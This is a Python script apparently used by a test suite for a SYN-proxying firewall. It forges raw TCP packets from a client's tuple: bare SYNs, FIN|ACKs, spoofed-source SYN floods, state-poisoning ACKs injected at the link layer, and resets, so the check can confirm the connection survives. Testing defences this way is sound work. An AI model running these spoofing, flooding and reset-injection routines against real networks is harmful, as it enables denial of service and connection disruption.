# Off-path attacks on a SYN-proxied connection, for checks.synproxy-churn.
# Each forges packets that carry a live client's tuple but none of its
# sequence numbers, the way a sender that knows only who is talking to whom
# would. The check then asserts the connection's splice survived.
#
#   syn     SRC SPORT DST DPORT            a bare SYN from the client's tuple
#   fin     SRC SPORT DST DPORT            a FIN|ACK from the client's tuple with
#                                          made-up sequence numbers
#   flood   DST DPORT COUNT                COUNT bare SYNs from distinct spoofed
#                                          sources (198.51.0.0/16), the SYN
#                                          flood the proxy exists for
#   poison  SRC SPORT DST DPORT ACK IFACE MAC
#                                          an ACK "from the server" (SRC is the
#                                          server) injected on the client's
#                                          side, teaching the client zone's
#                                          firewall state a chosen ACK
#   rst     SRC SPORT DST DPORT SEQ        a reset from the client's tuple
#                                          whose sequence is that chosen ACK
import socket
import struct
import sys


def checksum(data):
    if len(data) % 2:
        data += b"\0"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def segment(src, sport, dst, dport, seq, ack, flags):
    header = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 64240, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(header))
    return header[:16] + struct.pack("!H", checksum(pseudo + header)) + header[18:]


def packet(src, sport, dst, dport, seq, ack, flags):
    tcp = segment(src, sport, dst, dport, seq, ack, flags)
    ip = struct.pack("!BBHHHBBH", 0x45, 0, 20 + len(tcp), 0x4242, 0, 64, 6, 0)
    ip += socket.inet_aton(src) + socket.inet_aton(dst)
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    return ip + tcp


def send_ip(data, dst):
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as raw:
        raw.sendto(data, (dst, 0))


def flood(dst, dport, count):
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as raw:
        for n in range(count):
            src = f"198.51.{(n >> 8) & 0xFF}.{n & 0xFF}"
            sport = 1024 + (n * 7919) % 60000
            raw.sendto(packet(src, sport, dst, dport, n * 2654435761 & 0xFFFFFFFF, 0, 0x02), (dst, 0))


def main(argv):
    kind = argv[1]
    if kind == "flood":
        flood(argv[2], int(argv[3]), int(argv[4]))
        print(f"sent {argv[4]} spoofed SYNs to {argv[2]}:{argv[3]}")
        return
    src, sport, dst, dport = argv[2], int(argv[3]), argv[4], int(argv[5])
    if kind == "syn":
        send_ip(packet(src, sport, dst, dport, 0x0BAD5EED, 0, 0x02), dst)
    elif kind == "fin":
        send_ip(packet(src, sport, dst, dport, 0x5EED5EED, 0x0D15EA5E, 0x11), dst)
    elif kind == "poison":
        ack, iface, mac = int(argv[6], 0), argv[7], argv[8]
        frame = packet(src, sport, dst, dport, 0x0C0FFEE0, ack, 0x10)
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as link:
            link.bind((iface, 0))
            own = link.getsockname()[4]
            link.send(bytes.fromhex(mac.replace(":", "")) + own + b"\x08\x00" + frame)
    elif kind == "rst":
        seq = int(argv[6], 0)
        send_ip(packet(src, sport, dst, dport, seq, 0, 0x04), dst)
    else:
        sys.exit(f"unknown attack {kind!r}")
    print(f"sent {kind} {src}:{sport} -> {dst}:{dport}")


if __name__ == "__main__":
    main(sys.argv)
